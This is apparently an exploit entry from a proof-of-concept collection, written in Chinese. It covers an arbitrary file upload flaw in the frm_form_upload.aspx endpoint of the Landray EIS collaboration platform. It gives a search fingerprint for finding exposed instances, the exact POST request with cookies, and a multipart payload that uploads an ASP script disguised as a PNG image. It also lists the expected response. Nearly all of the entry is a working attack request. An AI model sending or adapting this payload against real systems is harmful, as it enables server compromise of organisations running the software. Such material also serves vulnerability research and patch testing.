# 蓝凌EIS智慧协同平台frm_form_upload.aspx接口存在任意文件上传漏洞

- **系统**：蓝凌EIS智慧协同平台frm_form_upload.aspx接口　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`icon_hash="953405444"`
- **请求**：`POST /frm/frm_form_upload.aspx HTTP/1.1`
- **关键头**：`Cookie: ASP.NET_SessionId=fqq0ks45w4yqpev52l3adnet; FIOA_IMG_FOLDER=FI; Lang=zh-cn`　`Content-Type: multipart/form-data; boundary=21781d3a946d7ccf8e68fbfe31e2d3…`

**请求体 / payload**
```
--21781d3a946d7ccf8e68fbfe31e2d375
Content-Disposition: form-data; name="__VIEWSTATE"
/wEPDwUKMTgyMDI2MjI1NQ9kFgJmD2QWAgIBDw8WAh4EVGV4dAUG5L+d5a2YZGRk0b9dFZuWblLyitK8Fh6njh8H4xA=
--21781d3a946d7ccf8e68fbfe31e2d375
Content-Disposition: form-data; name="__EVENTTARGET"
GB_SAVE
--21781d3a946d7ccf8e68fbfe31e2d375
Content-Disposition: form-data; name="__EVENTARGUMENT"
保存
--21781d3a946d7ccf8e68fbfe31e2d375
Content-Disposition: form-data; name="tpfile"; filename="dudesite.asp"
Content-Type: image/png
<% Response.Write("dudesite") %>
--21781d3a946d7ccf8e68fbfe31e2d375--
```
- **预期**：200　|　updateOpenerlmg